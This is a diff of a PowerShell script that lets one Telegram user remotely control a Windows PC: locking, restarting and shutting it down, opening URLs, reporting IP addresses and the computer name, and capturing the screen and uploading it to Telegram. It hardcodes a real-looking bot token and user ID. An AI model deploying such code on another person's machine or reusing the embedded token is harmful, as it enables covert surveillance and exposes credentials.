@@ -1,18 +1,9 @@
 # Telegram-Controlled PowerShell Script
-# Commands: /open_notepad, /visit <url>, /lock, /restart, /shutdown, /get_ip, /screenshot
+# Commands: /open_notepad, /visit <url>, /lock, /restart, /shutdown, /get_ip, /screenshot, /get_pcname
 $botToken = "7462575551:AAG66o16VhlQu_26sfPaEpIxvhRWKeHBh04"
 $userId = "5036966807"
 $apiUrl = "https://api.telegram.org/bot$botToken"
 $lastUpdateId = 0
-
-$mutexName = "MyTelegramBotMutex"
-$mutex = [System.Threading.Mutex]::new($false, $mutexName)
-$acquiredLock = $mutex.WaitOne(1) # Try to acquire the lock, return immediately
-
-if (-not $acquiredLock) {
-    Write-Host "Another instance of the bot is already running. Exiting."
-    exit
-}
 
 # Function to send a message via Telegram Bot
 function Send-TelegramMessage {
@@ -50,29 +41,29 @@ function Send-Screenshot {
     try {
         # Create temp file for screenshot
         $screenshotPath = "$env:TEMP\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        
+
         # Load required assemblies
         Add-Type -AssemblyName System.Windows.Forms
         Add-Type -AssemblyName System.Drawing
-        
+
         # Capture screenshot
         $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
         $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
         $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
         $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-        
+
         # Save screenshot
         $bitmap.Save($screenshotPath)
         $graphics.Dispose()
         $bitmap.Dispose()
-        
+
         # Send screenshot via Telegram
         $fileContent = [System.IO.File]::ReadAllBytes($screenshotPath)
         $fileContentBase64 = [Convert]::ToBase64String($fileContent)
-        
+
         $boundary = [Guid]::NewGuid().ToString()
         $LF = "`r`n"
-        
+
         $bodyLines = (
             "--$boundary",
             "Content-Disposition: form-data; name=`"chat_id`"$LF",
@@ -83,9 +74,9 @@ function Send-Screenshot {
             [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($fileContent),
             "--$boundary--$LF"
         ) -join $LF
-        
+
         Invoke-RestMethod -Uri "$apiUrl/sendPhoto" -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
-        
+
         # Clean up
         Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
         return $true
@@ -98,6 +89,28 @@ function Send-Screenshot {
 function Get-PCName {
     return $env:COMPUTERNAME
 }
+
+# Function to generate and send the help message
+function Send-HelpMessage {
+    param (
+        [string]$chatId
+    )
+    $helpMessage = @"
+Available Commands:
+
+/help - Displays this help message.
+/open_notepad - Opens the Notepad application.
+/visit <url> - Opens the specified URL in your default web browser.
+/lock - Locks your workstation.
+/restart - Restarts your computer.
+/shutdown - Shuts down your computer.
+/get_ip - Retrieves and displays the local and public IP addresses.
+/screenshot - Takes a screenshot and sends it to you.
+/get_pcname - Retrieves and displays the computer's name.
+"@
+    Send-TelegramMessage -chatId $chatId -message $helpMessage
+}
+
 # Notify when the system is running
 Send-TelegramMessage -chatId $userId -message "System is running"
 
@@ -126,24 +139,27 @@ while ($true) {
         foreach ($update in $updates.result) {
             $lastUpdateId = $update.update_id
             $chatId = $update.message.chat.id
-            $text = $update.message.text.Trim()  # Added Trim() to remove whitespace
-            
+            $text = $update.message.text.Trim()
+
             if ($chatId -ne $userId) { continue }
-            
+
             # Default reply
             $reply = "Unknown command."
-            
+
             # Command processing - improved matching
-            if ($text -eq "/get_ip") {
+            if ($text -eq "/help") {
+                Send-HelpMessage -chatId $chatId
+                continue # Skip the default reply
+            }
+            elseif ($text -eq "/get_ip") {
                 $localIP = Get-LocalIP
                 $publicIP = Get-PublicIP
                 $reply = "Local IP address: $localIP`nPublic IP address: $publicIP"
             }
-			
-			elseif ($text -eq "/get_pcname") {  # New command
-			$pcName = Get-PCName
-			$reply = "Computer Name: $pcName"
-			}
+            elseif ($text -eq "/get_pcname") {
+                $pcName = Get-PCName
+                $reply = "Computer Name: $pcName"
+            }
             elseif ($text -eq "/open_notepad") {
                 Start-Process notepad.exe
                 $reply = "Notepad opened."
@@ -168,7 +184,7 @@ while ($true) {
             elseif ($text -eq "/screenshot") {
                 $reply = "Taking screenshot..."
                 Send-TelegramMessage -chatId $chatId -message $reply
-                
+
                 $success = Send-Screenshot -chatId $chatId
                 if ($success) {
                     $reply = "Screenshot sent."
@@ -176,17 +192,15 @@ while ($true) {
                     $reply = "Failed to capture screenshot."
                 }
             }
-            
+
             # Print debugging info
             Write-Host "Received command: '$text'"
-            
-            # Send the response to the user
-            Send-TelegramMessage -chatId $chatId -message $reply
+
+            # Send the response to the user (unless it was the /help command)
+            if ($text -ne "/help") {
+                Send-TelegramMessage -chatId $chatId -message $reply
+            }
         }
-		
-		$mutex.ReleaseMutex()
-		$mutex.Dispose()
-		
         Start-Sleep -Seconds 2
     } catch {
         Write-Host "Error: $_"
